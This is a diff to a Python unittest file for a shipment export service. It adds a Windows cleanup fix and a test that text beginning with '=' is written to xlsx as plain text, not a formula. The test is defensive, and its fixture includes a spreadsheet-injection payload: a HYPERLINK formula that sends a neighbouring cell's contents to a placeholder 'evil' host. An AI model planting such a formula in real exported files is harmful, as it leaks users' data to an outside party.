@@ -63,6 +63,7 @@ class StaleShipmentsTest(unittest.TestCase):
 
     def tearDown(self):
         self.session.close()
+        self.db.engine.dispose()     # на Windows открытое соединение держит файл
         os.remove(self.db_path)
         for f in self._files:
             if os.path.exists(f):
@@ -334,6 +335,17 @@ class StaleShipmentsTest(unittest.TestCase):
                             c.fill.start_color.rgb)
         for c in by_posting["111-N-1"]:
             self.assertIsNone(c.fill.fill_type)
+
+    def test_text_starting_with_equals_sign_is_not_written_as_formula(self):
+        # Значения приходят из базы, которая могла прийти с Яндекс.Диска.
+        evil = '=HYPERLINK("http://evil/?"&B1,"Открыть")'
+        row = self._sample_row(product_name=evil, client_name="=1+1", cell="=A1")
+        out = self._tmp_xlsx()
+        self.service.export_xlsx([row], out)
+        ws = openpyxl.load_workbook(out).active
+        values = [c.value for c in ws[2]]
+        self.assertIn(evil, values)
+        self.assertTrue(all(c.data_type != "f" for c in ws[2]))
 
     def test_export_freeze_panes(self):
         out = self._tmp_xlsx()
